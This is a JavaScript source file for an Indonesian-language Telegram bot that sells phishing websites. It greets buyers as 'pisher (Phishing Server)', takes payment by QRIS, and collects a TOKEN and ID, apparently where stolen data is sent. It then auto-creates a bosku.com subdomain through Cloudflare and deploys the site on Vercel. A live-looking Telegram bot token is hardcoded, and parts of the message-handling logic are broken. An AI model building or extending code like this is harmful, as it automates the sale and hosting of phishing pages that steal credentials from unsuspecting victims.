
// Struktur Project Telegram Webstore Bot

import cloudflare from '../utils/cloudflare';
import vercel from '../utils/vercel';
import payment from '../utils/payment';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { message, callback_query } = req.body;
        let chatId, text;

        if (message) {
            chatId = message.chat.id;
            text = message.text.toLowerCase();

            if (text.includes('halo') || text.includes('hai') || text.includes('beli')) {
                await sendTelegramMessage(chatId, 'Halo bossku! Selamat datang di layanan jualan web otomatis saya. Silakan ketik *1. HALO* untuk memulai.', []);
                return res.status(200).json({ status: 'ok' });
            }

            if (text === '1. halo') {
                await sendTelegramMessage(chatId, 'Halo para pisher (Phishing Server), silahkan pilih web yang ingin kamu beli', [
                    [{ text: 'Web A', callback_data: 'web_A' }],
                    [{ text: 'Web B', callback_data: 'web_B' }],
                    [{ text: 'Web C', callback_data: 'web_C' }]
                ]);
                return res.status(200).json({ status: 'ok' });
            }
        }

        if (callback_query) {
            chatId = callback_query.message.chat.id;
            const webChoice = callback_query.data;

            const selectedWeb = webChoice.replace('web_', '').toUpperCase();
            const harga = 'Rp. 50.000';

            await sendTelegramMessage(chatId, `Anda ingin membeli link ini?\n1. Nama Link: ${selectedWeb}\n2. Harga: ${harga}`, [
                [{ text: 'Bayar Sekarang', callback_data: `bayar_${selectedWeb}` }]
            ]);
        }

        if (callback_query && callback_query.data.startsWith('bayar_')) {
            chatId = callback_query.message.chat.id;
            const webName = callback_query.data.replace('bayar_', '');
            const qrisLink = await payment.generatePayment(webName);

            await sendTelegramMessage(chatId, `Silakan bayar menggunakan QRIS berikut:\n${qrisLink}\n\nSetelah bayar, kirim format:\nTOKEN:xxxx ID:xxxx`);
        }

        if (text && text.startsWith('TOKEN:')) {
            const [tokenPart, idPart] = text.split('ID:');
            const token = tokenPart.replace('TOKEN:', '').trim();
            const userId = idPart.trim();

            await sendTelegramMessage(chatId, 'Silakan kirim nama website yang kamu inginkan (tanpa spasi)');

            global.userData = global.userData || {};
            global.userData[chatId] = { token, userId };
        } else if (text && /^[a-zA-Z0-9-]+$/.test(text)) {
            const siteName = text.toLowerCase();
            const fullDomain = `${siteName}.bosku.com`;

            await sendTelegramMessage(chatId, `Website kamu: https://${fullDomain}\nKlik tombol di bawah untuk buat web`, [
                [{ text: 'Buat Web', callback_data: `buatweb_${siteName}` }]
            ]);

            global.userData[chatId] = {
                ...global.userData[chatId],
                siteName
            };
        }

        if (callback_query && callback_query.data.startsWith('buatweb_')) {
            chatId = callback_query.message.chat.id;
            const siteName = callback_query.data.replace('buatweb_', '');

            await cloudflare.createSubdomain(siteName);
            await vercel.deploySite(siteName, global.userData[chatId]);

            await sendTelegramMessage(chatId, `Website kamu sudah jadi bossku! 🚀\nLink: https://${siteName}.bosku.com`);
        }

        res.status(200).json({ status: 'ok' });
    } else {
        res.status(405).end();
    }
}

async function sendTelegramMessage(chatId, text, buttons = []) {
    const telegramToken = '7785695206:AAHDvRmyKRqcwx-3hfhBMjvnxqa47vl1rdg';
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const body = {
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    };

    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
}
